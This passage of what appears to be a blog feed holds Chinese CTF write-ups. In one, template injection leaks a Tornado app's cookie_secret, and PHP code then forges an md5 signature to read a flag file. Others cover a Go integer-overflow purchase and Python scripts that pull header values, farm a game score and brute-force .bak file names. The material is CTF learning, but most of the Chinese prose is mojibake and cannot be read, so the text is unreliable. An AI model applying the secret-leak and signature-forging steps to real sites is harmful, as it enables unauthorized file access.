´ä¸€æ³¢secretã€‚ã€‚ã€‚è¿˜ä¸€åº¦è®¤ä¸ºæ˜¯Hashé•¿åº¦æ‹“å±•æ”»å‡»ã€‚ã€‚ã€‚ã€‚å°´å°¬</p><p>å…³é”®ç‚¹åœ¨äº<code>cookie_secret</code></p><p>å½“æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸œè¥¿çš„æ—¶å€™ä¼šå‡ºç°ä¸€ä¸ªæŠ¥é”™é¡µé¢<br><a href="https://imgchr.com/i/iUPn39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPn39.md.png" alt="iUPn39.md.png"></a></p><p>è¿™ä¸ªé¡µé¢è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œå¹¶ä¸”è¿”å›Orz</p><p>è¾“å…¥</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p><a href="https://imgchr.com/i/iUPucR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPucR.md.png" alt="iUPucR.md.png"></a></p><p>è¿™é‡Œçš„è¯é£˜é›¶å¤§ä½¬è¯´å¯ä»¥è¿›è¡Œæ¨¡æ¿æ³¨å…¥ï¼Œå¹¶ä¸”åªèƒ½è¯»ä¸€ä¸ªå˜é‡<br>æ¥ä¸‹æ¥çš„æ€è·¯æ‰æ˜¯éªšï¼Œç›´æ¥é˜…è¯»tornadoçš„æºç <br><code>https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</code></p><p>åœ¨<code>handler.settings</code> é‡Œé¢å­˜åœ¨<code>cookie_secret</code>è¿™ä¸œè¥¿</p><p>è¯»å–ä¸€ä¸‹</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p>æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œçš„ä¸¤ä¸ªå¤§æ‹¬å·{}æ˜¯èµ·åˆ°æ¸²æŸ“æ¨¡æ¿çš„ä½œç”¨ã€‚ã€‚ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;&apos;login_url&apos;: &apos;/login&apos;, &apos;template_path&apos;: &apos;templates&apos;, &apos;xsrf_cookies&apos;: True, &apos;cookie_secret&apos;: &apos;B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb&apos;, &apos;debug&apos;: False, &apos;file_path&apos;: &apos;/www/static/files&apos;, &apos;static_path&apos;: &apos;static&apos;&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŠŠé‡Œé¢çš„å†…å®¹ç»™è¯»å‡ºæ¥ï¼Œä»¥åè¿˜æ˜¯å¾—å¯¹pythonçš„MVCæ¶æ„å­¦ä¹ ä¸€ä¸‹æ‰è¡Œã€‚ã€‚</p><p>ç«‹å³æ„é€ ç­¾å<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">'B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb'</span>.md5(<span class="string">'/fllllllllllag'</span>)) ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>http://49.4.95.5:31792/file?filename=/fllllllllllag&amp;signature=3e9f949b7c37c999287eb096f576be00</code></p><p>å¾—åˆ°flag<br><a href="https://imgchr.com/i/iUPKj1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPKj1.md.png" alt="iUPKj1.md.png"></a></p><h4 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h4><p>è¿™ä¸ªé¢˜ç›®ä¸€å¼€å§‹æˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯å‰ç«¯çš„<code>ajax</code>çš„æ“ä½œé—®é¢˜ï¼Œç›´åˆ°çœ‹äº†é£˜é›¶å¤§å“¥çš„wpæ‰çŸ¥é“æœ‰ä¸¤ç§æ€è·¯ï¼Œä¸€ç§æ˜¯æ¡ä»¶ç«äº‰ï¼Œä½†æ¡ä»¶ç«äº‰å¥½åƒè¿˜æ˜¯æœ‰ä¸Šé™çš„ï¼Œå¼€ä¸ªå¤šçº¿ç¨‹è·‘ä¸€ä¸‹ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºäº†åé¢çš„æ€ªå¼‚çš„<code>9999999</code>åšé“ºå«,å› ä¸ºä½ æ²¡æœ‰5ä¸ªä»¥ä¸Šçš„å¤§è¾£æ¡æ˜¯æ¢ä¸äº†è¾£æ¡ä¹‹ç‹çš„ã€‚<br><img src="https://s1.ax1x.com/2018/10/14/iUP1HK.png" alt="iUP1HK.png"><br>ç„¶åå°±ä¼šå‘ç°è¾£æ¡æ•°ç›®å‡ å˜æˆ7ä¸ª<br><img src="https://s1.ax1x.com/2018/10/14/iUP8AO.png" alt="iUP8AO.png"></p><p>ä¸‹é¢æ‰æ˜¯é‡ç‚¹ï¼Œå› ä¸ºè¿™é‡Œæ˜¯ç”¨çš„æ˜¯Goè¯­è¨€ï¼Œå¾ˆå¯èƒ½å­˜åœ¨æ•´æ•°æº¢å‡ºï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« <br><a href="http://www.it1352.com/808569.html" target="_blank" rel="noopener">http://www.it1352.com/808569.html</a></p><p>goè¯­è¨€æ•´æ•°æº¢å‡ºä¸º<code>18446744073709551615</code>ï¼Œç„¶åå¯ä»¥è®¡ç®—<code>number=(18446744073709551615/5)+1=3689348814741910324</code>ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ç›´æ¥æº¢å‡ºè·å¾—flag<br>ä¸‹é¢è¿™ç¯‡åšå®¢å¯¹äºæº¢å‡ºè¿‡å¤§æœ‰æ›´æ·±çš„ç†è§£:<br><a href="https://qingchenldl.github.io/2018/10/13/æŠ¤ç½‘æ¯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/æŠ¤ç½‘æ¯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://imgchr.com/i/iUPGND" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPGND.md.png" alt="iUPGND.md.png"></a></p><p>è¿˜æœ‰ä¸€é“é¢˜ç›®æ˜¯å…³äºLaravelæ¡†æ¶çš„è§£é¢˜è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯ç§€ï¼ŒçŸ¥è¯†ç‚¹ä¹Ÿå¾ˆå¤šï¼Œå»ºè®®å»çœ‹çœ‹ä¸€å¶é£˜é›¶å­¦é•¿çš„åšå®¢å•¦ã€‚</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>è¿™æ¯”èµ›åˆå­¦åˆ°äº†ä¸å°‘çš„ä¸œè¥¿ï¼Œæœç„¶pythonå¼€å‘å‡ºæ¥çš„webæ¡†æ¶è¿˜æ˜¯è‡ªå·±çš„å¼±é¡¹ï¼Œæ¡ä»¶ç«äº‰è¿™ä¸œè¥¿çœ‹æ¥ç°åœ¨æ¯”èµ›éƒ½å¾ˆæµè¡Œå‘¢ï¼Œå¯æƒœè‡ªå·±å¯¹è¿™æ–¹é¢çš„åšé¢˜æ•æ„Ÿåº¦ä¸å¤Ÿï¼Œä»¥å‰ä¸€ç›´è®¤ä¸ºè¿™åªæœ‰å®‰æ’çš„æœˆèµ›æ‰ä¼šå‡ºï¼Œä»¥åè¿˜æ˜¯å¾—æ¥è§¦pwnäº†ï¼Œç»§ç»­åŠªåŠ›ã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CUMTå¹³å°çš„éƒ¨åˆ†é¢˜è§£</title>
      <link href="/CUMT-CTF-Platform.html"/>
      <url>/CUMT-CTF-Platform.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨ä¸Šç½‘è·¯å®‰å…¨å®éªŒè¯¾ç¨‹çš„æ—¶å€™ï¼Œå…¶ä¸­ä¸€ä¸ªä»»åŠ¡å°±æ˜¯å®Œæˆè¿™é‡Œé¢çš„é¢˜ç›®ï¼Œæˆ‘è¿˜æ˜¯è®°å½•ä¸€ä¸‹å§ï¼Œ<a id="more"></a>,åˆ°æ—¶å€™è¡¥å……åˆ°å®éªŒæŠ¥å‘Šé‡Œé¢</p><h2 id="basicéƒ¨åˆ†"><a href="#basicéƒ¨åˆ†" class="headerlink" title="basicéƒ¨åˆ†"></a>basicéƒ¨åˆ†</h2><h4 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h4><p>è¿™ä¸ªé¢˜ç›®ä¸‹è½½ä¹‹åæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯é‡Œé¢ä»€ä¹ˆä¸œè¥¿ä¹Ÿæ²¡æœ‰ï¼Œäºæ˜¯æ”¾è¿›HXDé‡Œé¢æŸ¥çœ‹æ˜¯å¦æœ‰å…¶ä»–çš„ä¸œè¥¿ï¼Œæ‰“å¼€å‘ç°åå…­è¿›åˆ¶ç¼–ç ï¼Œç”¨Hackbarè§£ç å¾—åˆ°flag<br><a href="https://imgchr.com/i/ilTbin" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTbin.md.png" alt="ilTbin.md.png"></a><br><a href="https://imgchr.com/i/ilTLR0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTLR0.md.png" alt="ilTLR0.md.png"></a></p><h4 id="ç™½é©¹è¿‡éš™"><a href="#ç™½é©¹è¿‡éš™" class="headerlink" title="ç™½é©¹è¿‡éš™"></a>ç™½é©¹è¿‡éš™</h4><p>é¢˜ç›®çš„æ„æ€æ˜¯è¯´å¿«ï¼Œæ‰“å¼€é¡µé¢å°±ä¼šå‘ç°é”™è¿‡äº†flagä¹‹ç±»çš„æ“ä½œï¼Œè‚¯å®šæ˜¯å­˜åœ¨è·³è½¬ï¼Œè€é¢˜ç›®è¦ä¹ˆå°±æŠ“åŒ…ï¼Œè¦ä¹ˆå°±curlä¸€ä¸‹ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç”¨vpsæ¥curlä¸€ä¸‹è¿™ä¸ªç½‘å€ï¼Œç›´æ¥å‡ºflag<br><a href="https://imgchr.com/i/ilTjMT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTjMT.md.png" alt="ilTjMT.md.png"></a></p><h4 id="é½ç™½çŸ³"><a href="#é½ç™½çŸ³" class="headerlink" title="é½ç™½çŸ³"></a>é½ç™½çŸ³</h4><p>è¿™å°¼ç›æˆ‘æ„Ÿè§‰è¿™æ˜¯å¼‚å½¢ã€‚ã€‚å…³é½ç™½çŸ³ä»€ä¹ˆäº‹ã€‚ã€‚ã€‚æ ¹æ®æç¤ºå…ˆæŠŠå›¾ç‰‡åœ¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€çœ‹ä¸€ä¸‹<br>ï¼Œæ‹‰åˆ°æœ€åä¸€è¡Œå‘ç°flag<br><a href="https://imgchr.com/i/ilTvsU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTvsU.md.png" alt="ilTvsU.md.png"></a></p><h4 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h4><p>æ‰“å¼€æ–‡ä»¶ä¼šå‘ç°ä¸€å †æ··æ·†ï¼Œæ€€ç–‘æ˜¯jsæ··æ·†ï¼Œç„¶åæ”¾è¿›ç«ç‹çš„jsè°ƒè¯•å™¨é‡Œé¢ç›´æ¥æ‰§è¡Œå°±å‡ºç°flagäº†<br><a href="https://imgchr.com/i/ilTxLF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTxLF.md.png" alt="ilTxLF.md.png"></a></p><h4 id="DNSè§£æ"><a href="#DNSè§£æ" class="headerlink" title="DNSè§£æ"></a>DNSè§£æ</h4><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯è€ƒäº†Windowsä¸‹é¢çš„ä¸€ä¸ªDNSè§£æçš„hostsæ–‡ä»¶ï¼Œå…¶å®è¿™æ˜¯ä¸ªå†å²é—ç•™é—®é¢˜ï¼Œå°±æ˜¯æ¯æ¬¡è¦å»ç»è¿‡DNSè§£æçš„æ—¶å€™éƒ½ä¼šé»˜è®¤å…ˆå»æ‰¾ä¸€ä¸‹è¿™ä¸ªhostæ–‡ä»¶é‡Œé¢çš„ç›¸å…³åŸŸåæ‰€å¯¹åº”çš„ipå°±ä¼šå…å»æŸ¥ä¸Šå±‚DNSæœåŠ¡å™¨é‡Œé¢çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨hostsæ–‡ä»¶ä¸‹é¢æ·»åŠ ï¼Œè¿™ä¸€è¡Œï¼Œç„¶åè¾“å…¥é¢˜ç›®å¯¹åº”çš„çš„åŸŸåå³å¯<br>hostæ–‡ä»¶çš„ç›®å½•:<code>C:\Windows\System32\drivers\etc\hosts</code></p><p><a href="https://imgchr.com/i/il7pdJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7pdJ.md.png" alt="il7pdJ.md.png"></a><br><a href="https://imgchr.com/i/il79o9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il79o9.md.png" alt="il79o9.md.png"></a></p><h4 id="forfun2"><a href="#forfun2" class="headerlink" title="forfun2"></a>forfun2</h4><p>è¿™é¢˜ä¹Ÿæ˜¯éªšæ°”ï¼Œæˆ‘ä»–å–µä¸€ç›´æŸ¥çœ‹æºä»£ç éƒ½æ²¡æ‰¾åˆ°ï¼Œç»“æœæˆ‘åœ¨åŸç½‘é¡µä¸Šç‚¹å‡»äº†æŸ¥çœ‹èƒŒæ™¯å›¾ç‰‡ï¼Œå°±å‡ºç°flagäº†å—ä¸äº†ã€‚ã€‚ã€‚è¿™é¢˜æœ‰ç‚¹å‘ã€‚ã€‚ä»¥å‰éƒ½æ²¡è¯•è¿‡ç½‘ç½‘é¡µå›¾ç‰‡ä¸Šéšè—ä¿¡æ¯æƒ³ã€‚ã€‚ã€‚ã€‚<br><a href="https://imgchr.com/i/il7PiR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7PiR.md.png" alt="il7PiR.md.png"></a></p><h4 id="forfun"><a href="#forfun" class="headerlink" title="forfun"></a>forfun</h4><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯ä¸€ç›´å³å‡»æŸ¥çœ‹æºä»£ç ï¼Œæ‰¾åˆ°flagä¸ºæ­¢ï¼Œflagåœ¨å…¶ä¸­çš„è¿™ä¸ªé¡µé¢ä¸‹å¦‚å›¾<br><a href="https://imgchr.com/i/il7iJ1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7iJ1.md.png" alt="il7iJ1.md.png"></a><br>è¿›å»ä¹‹åç”¨<code>ctrl+f</code>æ‰¾åˆ°å¯¹åº”çš„flag<br><a href="https://imgchr.com/i/il7FRx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7FRx.md.png" alt="il7FRx.md.png"></a></p><h4 id="ç­¾åˆ°1"><a href="#ç­¾åˆ°1" class="headerlink" title="ç­¾åˆ°1"></a>ç­¾åˆ°1</h4><p>æ‰“å¼€é¢˜ç›®è®©æˆ‘ä»¬check the source code !!ï¼Œç‚¹å‡»å³é”®æŸ¥çœ‹æºä»£ç å‘ç°ä¸€æ®µbase64ï¼Œè§£ç å¾—åˆ°<code>flag{this_is_so_easy_is_it?}</code><br><a href="https://imgchr.com/i/il7EQK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7EQK.md.png" alt="il7EQK.md.png"></a></p><h4 id="ç­¾åˆ°2"><a href="#ç­¾åˆ°2" class="headerlink" title="ç­¾åˆ°2"></a>ç­¾åˆ°2</h4><p>æ‰“å¼€ç½‘ç«™å‘ç°http header!!!<br>ç„¶åF12å»çœ‹çœ‹httpå¤´éƒ¨çš„ä¿¡æ¯ï¼Œå‘ç°flag<br><img src="https://s1.ax1x.com/2018/09/30/il7VsO.png" alt="il7VsO.png"></p><h4 id="è¶…ç®€å•çš„å¯†ç "><a href="#è¶…ç®€å•çš„å¯†ç " class="headerlink" title="è¶…ç®€å•çš„å¯†ç "></a>è¶…ç®€å•çš„å¯†ç </h4><p>è¿™ä¸€ä¸ªé¢˜ç›®å¾ˆæ˜æ˜¾çš„æç¤ºï¼Œæ³¨æ„çœ‹é”®ç›˜å¾ˆæ˜¾ç„¶è¿™æ˜¯ä¸ªé”®ç›˜å¯†ç ï¼Œä»é”®ç›˜ä¸Šç¿»è¯‘ä¸€ä¸‹å°±å¥½å¾—åˆ°<br>flag{isee}</p><h4 id="æ»‘ç¨½"><a href="#æ»‘ç¨½" class="headerlink" title="æ»‘ç¨½"></a>æ»‘ç¨½</h4><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªpptï¼Œppté‡Œé¢æ²¡å‘ç°äº›ä»€ä¹ˆï¼Œä½†æ˜¯è¿™ä¸ªä¸œè¥¿æ˜¯éœ€è¦è§£å¯†çš„<br>ç„¶åæ”¾åˆ°16è¿›åˆ¶ç¼–è¾‘å™¨é‡Œé¢çœ‹ä¸€ä¸‹å‘ç°æœ‰zipåŒ…çš„æ–‡ä»¶å¤´ï¼Œäºæ˜¯å°±å¼€å§‹æŠŠè¿™ä¸ªæ–‡ä»¶åç¼€æ”¹ä¸ºzipæ‰“å¼€<br><img src="https://s1.ax1x.com/2018/09/30/il7ndH.png" alt="il7ndH.png"></p><p>åœ¨é‡Œé¢æ‰¾åˆ°ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„å›¾ç‰‡æ–‡ä»¶ï¼Œå…¶ä½™çš„å›¾ç‰‡éƒ½èƒ½æ˜¾ç¤ºå°±ä»–ä¸èƒ½ï¼Œæ”¾è¿›16è¿›åˆ¶ç¼–è¾‘å™¨çœ‹ä¸€ä¸‹å‘ç°pptçš„base64åŠ å¯†çš„å¯†ç ï¼Œè§£å¼€ä¹‹åå°±æ˜¯pptå¯†ç <code>cumt2017ctf</code><br><a href="https://imgchr.com/i/il7uod" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7uod.md.png" alt="il7uod.md.png"></a><br>å†æŠŠæ–‡ä»¶åç¼€æ”¹ä¸ºpptï¼Œè¾“å…¥å¯†ç ï¼Œç§»åŠ¨ä¸€ä¸‹pptå°±å‘ç°flagäº†<br><a href="https://imgchr.com/i/il7MFA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7MFA.md.png" alt="il7MFA.md.png"></a></p><h4 id="Fast-30"><a href="#Fast-30" class="headerlink" title="Fast 30"></a>Fast 30</h4><p>è¿™æ˜æ˜¾å°±æ˜¯ä¸€ä¸ªè„šæœ¬é¢˜ï¼Œå«ä½ 2så†…postä½ å‘ç°çš„ä¸œè¥¿ï¼Œå¯ä»¥åœ¨http headeré‡Œé¢å‘ç°æœ‰ä¸ªflagé€‰é¡¹æƒ³å¿…å°±æ˜¯æŠŠè¿™ä¸ªä¸œè¥¿ç»™postä¸Šå»ï¼Œå‚æ•°æ˜¯keyï¼Œä¸‹é¢æ˜¯æˆ‘å†™çš„è„šæœ¬<br><img src="https://s1.ax1x.com/2018/09/30/il7QJI.png" alt="il7QJI.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://web.bxsteam.xyz/fast/'</span></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line">ans = req.get(url)</span><br><span class="line"></span><br><span class="line">param =  ans.headers[<span class="string">'Flag'</span>]</span><br><span class="line"></span><br><span class="line">flag = req.post(url,data=&#123;<span class="string">'key'</span>:param&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag.content</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/09/30/il78Qf.png" alt="il78Qf.png"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h4><p>è¿™ä¸ªé¢˜ç›®æ˜¯æŸ¥æ‰¾é¡µé¢çš„å…ƒç´ ï¼Œæ‰“å¼€ä¹‹åå‘ç°ä¸€æ®µå¯ç–‘çš„ä¿¡æ¯å…¶å®å°±æ˜¯æŠŠé‡Œé¢çš„ä¸­æ–‡å­—ä½“å»æ‰å°±æ˜¯flag<br><a href="https://imgchr.com/i/il7Gy8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7Gy8.md.png" alt="il7Gy8.md.png"></a></p><h4 id="colorSnake"><a href="#colorSnake" class="headerlink" title="colorSnake"></a>colorSnake</h4><p>è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œè™½ç„¶è¦å†™ä¸ªè„šæœ¬å½“ç„¶ä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨å»æ‰§è¡Œã€‚ã€‚ã€‚è¿™ä¸ªè¿›å»å°±æ˜¯ä¸€ä¸ªå°æ¸¸æˆï¼Œç‚¹å‡»å³é”®æŸ¥çœ‹æºç åå‘ç°æ˜¾ç¤ºåˆ†æ•°çš„åœ°æ–¹idæ˜¯scoreï¼ŒæŸ¥çœ‹ä»–çš„æºä»£ç å‘ç°è¿˜å­˜åœ¨ä¸€ä¸ªgame.jsçš„ä»£ç è„šæœ¬ï¼Œäºæ˜¯ç«‹å³åœ¨é‡Œé¢æœå…³äºscoreçš„ä¿¡æ¯<br>ç„¶åå‘ç°äº†è¿™æ ·çš„ä¸€æ®µä»£ç ï¼ŒåŒæ—¶å‘ç°ä¸€ä¸ªå¾ˆå¯ç–‘çš„phpä»£ç ï¼Œè¿™é‡Œé¢æœ‰ä¸ªxhrï¼Œä»‹ç»ä¸€ä¸‹xhrï¼Œxhrå«XMLHttpRequest ï¼ŒXMLHttpRequest å¯¹è±¡æä¾›äº†å¯¹ HTTP åè®®çš„å®Œå…¨çš„è®¿é—®ï¼ŒåŒ…æ‹¬åšå‡º POST å’Œ HEAD è¯·æ±‚ä»¥åŠæ™®é€šçš„ GET è¯·æ±‚çš„èƒ½åŠ›ã€‚XMLHttpRequest å¯ä»¥åŒæ­¥æˆ–å¼‚æ­¥åœ°è¿”å› Web æœåŠ¡å™¨çš„å“åº”ï¼Œå¹¶ä¸”èƒ½å¤Ÿä»¥æ–‡æœ¬æˆ–è€…ä¸€ä¸ª DOM æ–‡æ¡£çš„å½¢å¼è¿”å›å†…å®¹ã€‚<br><a href="https://imgchr.com/i/il7NwQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7NwQ.md.png" alt="il7NwQ.md.png"></a></p><p>ä¹Ÿå°±æ˜¯å»è®¿é—®è¿™ä¸ªé¡µé¢çš„åŠŸèƒ½ï¼Œæˆ‘ä¹Ÿå»è®¿é—®ï¼Œå‘ç°æœ‰jsonæ ¼å¼çš„ä¸œè¥¿ï¼ŒæŠŠé‡Œé¢çš„msgéƒ¨åˆ†çš„å†…å®¹unicodeè§£ç ï¼Œå‘ç°æç¤ºï¼Œè¿™ä¹ˆä¹…æ‰åƒåˆ°ä¸€ä¸ªï¼Œé›¶åˆ†ï¼å¯ä»¥çŒœåˆ°åº”è¯¥æ˜¯ç”¨è¿™ä¸ªå»è®¿é—®é¡µé¢å»å¢åŠ å¾—åˆ†ï¼Œæ¯åˆ·æ–°ä¸€ä¸‹è¿™ä¸ªé¡µé¢å‘ç°scoreåŠ ä¸€äº†ï¼Œä½†æ˜¯åˆ·æ–°çš„å¤ªå¿«åˆä¼šé‡æ–°ç½®0ï¼Œæ‰€ä»¥æˆ‘å°±å†™äº†ä¸ªå°è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://202.119.201.199/challenge/web/colorSnake/getScore.php'</span></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">55</span>):    <span class="comment">#æ€•ä¼šå‡ºç°é‡æ–°ç½®é›¶çš„ç°è±¡ï¼Œå› æ­¤è®¾ç½®çš„æ•°æ¯”50å¤§</span></span><br><span class="line">time.sleep(<span class="number">1</span>)    <span class="comment">#ç”¨äºå»¶æ—¶</span></span><br><span class="line">ans = req.get(url)</span><br><span class="line">msg = json.loads(ans.content)[<span class="string">'msg'</span>]</span><br><span class="line"><span class="keyword">print</span> json.loads(ans.content)[<span class="string">'score'</span>],msg.encode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure></p><p>æœ€åå¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/09/30/il7dFs.png" alt="il7dFs.png"></p><h4 id="å¤‡ä»½"><a href="#å¤‡ä»½" class="headerlink" title="å¤‡ä»½"></a>å¤‡ä»½</h4><p>å¤‡ä»½è¿™ä¸ªé¢˜ç›®æ„Ÿè§‰ä¹Ÿæ˜¯ä¸€ä¸ªè„šæœ¬é¢˜ç›®ï¼Œä¸€è¿›å»é¢˜ç›®å°±æç¤ºThere are too much baks in the website ,can you find the flag in these baks?ï¼Œè¯´æ˜æˆ‘ä»¬è¦éå†å¤šä¸ªbakæ–‡ä»¶å¹¶ä¸”è¯»å–é‡Œé¢çš„å†…å®¹ã€‚ã€‚ã€‚åªè¦getè¯·æ±‚å°±èƒ½ä¸‹åœ¨ç›¸å…³bakæ–‡ä»¶äº†<br><a href="https://imgchr.com/i/il7DS0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7DS0.md.png" alt="il7DS0.md.png"></a><br>ç›´æ¥æ”¾ä¸Šæˆ‘å†™çš„è„šæœ¬ã€‚ã€‚ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://202.119.201.199/challenge/web/code/&#123;num&#125;.bak"</span></span><br><span class="line">res = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1500</span>):      <span class="comment">#å¼€å¤§ç‚¹æ— æ‰€è°“</span></span><br><span class="line">payload = url.format(num=i)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans = res.get(payload)</span><br><span class="line">file_name = <span class="string">'&#123;_&#125;.bak'</span>.format(_=i)</span><br><span class="line"><span 